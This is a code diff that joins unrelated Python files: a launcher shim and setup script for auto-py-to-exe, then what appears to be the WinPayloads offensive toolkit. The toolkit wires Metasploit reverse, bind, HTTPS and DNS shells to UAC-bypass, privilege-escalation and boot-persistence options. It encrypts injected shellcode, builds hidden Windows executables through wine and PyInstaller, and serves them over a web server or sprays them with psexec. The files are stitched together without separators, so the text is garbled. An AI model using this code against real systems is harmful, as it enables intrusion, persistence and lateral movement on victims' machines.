@@ -1,0 +1,212 @@
+"""
+This file (as well as requirements.txt) has been kept to make sure the original instructions illustrated in the demonstration video are still valid.
+This script is simply a hack to make it seem like `python -m auto_py_to_exe` was called when `python run.py` is executed.
+"""
+
+from auto_py_to_exe import __main__ as apte
+
+apte.__name__ = '__main__'
+apte.run()from io import open
+from setuptools import setup
+from auto_py_to_exe import __version__ as version
+
+setup(
+    name='auto-py-to-exe',
+    version=version,
+    url='https://github.com/brentvollebregt/auto-py-to-exe',
+    license='MIT',
+    author='Brent Vollebregt',
+    author_email='brent@nitratine.net',
+    description='Converts .py to .exe using a simple graphical interface.',
+    long_description=''.join(open('README.md', encoding='utf-8').readlines()),
+    long_description_content_type='text/markdown',
+    keywords=['gui', 'executable'],
+    packages=['auto_py_to_exe'],
+    include_package_data=True,
+    install_requires=['Eel>=0.9.9', 'pyinstaller'],
+    python_requires='>=2.7',
+    classifiers=[
+        'License :: OSI Approved :: MIT License',
+        'Programming Language :: Python',
+        'Programming Language :: Python :: 2',
+        'Programming Language :: Python :: 2.7',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.3',
+        'Programming Language :: Python :: 3.4',
+        'Programming Language :: Python :: 3.5',
+        'Programming Language :: Python :: 3.6',
+        'Programming Language :: Python :: 3.7',
+        'Operating System :: Microsoft :: Windows',
+        'Operating System :: POSIX :: Linux',
+    ],
+    entry_points={
+        'console_scripts': [
+            'autopytoexe=auto_py_to_exe.__main__:run',
+            'auto-py-to-exe=auto_py_to_exe.__main__:run'
+        ],
+    },
+)#!/usr/bin/python
+from lib.main import *
+from lib.payloadextras import *
+from lib.startmetasploit import *
+from lib.menu import *
+
+
+try:
+    from lib.psexecspray import *
+except:
+    print t.bold_red + "[!] Rerun the setup.sh" + t.normal
+
+if not re.search('winpayloads', os.getcwd().lower()):
+    print t.bold_red + "[!!] Please Run From Winpayloads Dir" + t.normal
+    sys.exit(1)
+
+DIR = os.path.expanduser('~') + '/winpayloads'
+if not os.path.isdir(DIR):
+    os.mkdir(DIR)
+
+
+try:
+    print t.bold_green + "Checking if up-to-date || ctr + c to cancel" + t.normal
+    gitrev = subprocess.check_output(['git', 'rev-parse', 'HEAD']).rstrip()
+    gitlsremote = subprocess.check_output(['git', 'ls-remote', 'origin', 'master']).split()[0]
+    if gitrev != gitlsremote:
+        updateornah = raw_input(t.bold_red + "Do you want to update WinPayloads? y/[n]: " + t.normal)
+        if updateornah.lower() == "y":
+            p = subprocess.Popen(['git','pull'])
+            p.wait()
+            print t.bold_yellow + "Reload Winpayloads..." + t.normal
+            sys.exit()
+except subprocess.CalledProcessError:
+    print  t.bold_red + "[!] No Connection to Github" + t.normal
+except KeyboardInterrupt:
+    pass
+
+
+from lib.listener import StartAsync
+async = StartAsync()
+async.start()
+
+try:
+    getAndRunMainMenu()
+except KeyboardInterrupt:
+    print t.bold_green + '\n[*] Cleaning Up\n' + t.normal
+    subprocess.call(['rm *.rc'], shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['rm *.ps1'], shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['rm logdict*'], shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)from main import *
+from payloadextras import *
+from psexecspray import *
+from startmetasploit import *
+from generatepayload import *
+from menu import *
+from encrypt import *
+from stager import *
+
+
+METASPLOIT_Functions = {
+    'reverse': {
+        'uacbypass': METASPLOIT().metrev_uac,
+        'allchecks': METASPLOIT().metrev_allchecks,
+        'persistence': METASPLOIT().metrev_persistence,
+        'normal': METASPLOIT().metrev_normal
+    },
+    'bind': {
+        'uacbypass': METASPLOIT().metbind_uac,
+        'allchecks': METASPLOIT().metbind_allchecks,
+        'persistence': METASPLOIT().metbind_persistence,
+        'normal': METASPLOIT().metbind_normal
+    },
+    'https': {
+        'uacbypass': METASPLOIT().methttps_uac,
+        'allchecks': METASPLOIT().methttps_allchecks,
+        'persistence': METASPLOIT().methttps_persistence,
+        'normal': METASPLOIT().methttps_normal
+    },
+    'dns': {
+        'uacbypass': METASPLOIT().metdns_uac,
+        'allchecks': METASPLOIT().metdns_allchecks,
+        'persistence': METASPLOIT().metdns_persistence,
+        'normal': METASPLOIT().metdns_normal
+    },
+    'nclistener': {
+        'nclisten': METASPLOIT().nclisterner,
+    }
+}
+def askAndReturnModules(shellcode, metasploit_type):
+    if metasploit_type == 'nclistener':
+        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])
+    else:
+        want_UACBYPASS = raw_input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)?' + t.bold_red + ' y/[n]:' + t.normal)
+        if want_UACBYPASS.lower() == 'y':
+            win7orwin10 = raw_input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
+            if not win7orwin10:
+                win7orwin10 = "10"
+            return (EXTRAS(shellcode).UACBYPASS(win7orwin10), METASPLOIT_Functions[metasploit_type]['uacbypass'])
+
+        want_ALLCHECKS = raw_input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
+        if want_ALLCHECKS.lower() == 'y':
+            return (EXTRAS(shellcode).ALLCHECKS(), METASPLOIT_Functions[metasploit_type]['allchecks'])
+
+        want_PERSISTENCE = raw_input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
+        if want_PERSISTENCE.lower() == 'y':
+            return (EXTRAS(shellcode).PERSISTENCE(), METASPLOIT_Functions[metasploit_type]['persistence'])
+
+        return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
+
+def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
+    from menu import clientMenuOptions
+    if len(clientMenuOptions.keys()) > 2:
+        from stager import clientUpload
+        if clientUpload(powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}'):
+            return True
+
+    randoFileName = ''.join(random.sample(string.ascii_lowercase, 8))
+    with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
+        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
+        Filesave.close()
+    print '[*] Creating Payload using Pyinstaller...'
+
+    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
+                          '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile'], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    LOADING = Spinner('Generating Payload')
+    while p.poll() == None:
+        LOADING.Update()
+        time.sleep(0.2)
+    print '\r',
+    sys.stdout.flush()
+
+    payloadstderr = p.stderr.read()
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "-debug":
+            sys.stdout.write(payloadstderr)
+    try:
+        os.rename('dist/%s.exe' % randoFileName, '%s/%s.exe' % (payloaddir(), randoFileName))
+    except OSError:
+        print t.bold_red + "[!] Error while creating payload..." + t.normal
+        print payloadstderr
+        return False
+
+    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal
+    CleanUpPayloadMess(randoFileName)
+    DoPayloadUpload(randoFileName)
+    return True
+
+
+def CleanUpPayloadMess(randoFileName):
+    os.system('rm dist -r')
+    os.system('rm build -r')
+    os.system('rm *.spec')
+    os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
+
+def DoPayloadUpload(payloadname):
+    from menu import returnIP
+    want_to_upload = raw_input(
+        '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
+    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
+        DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
+    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
+        FUNCTIONS().DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt = True)
+    sys.exit()
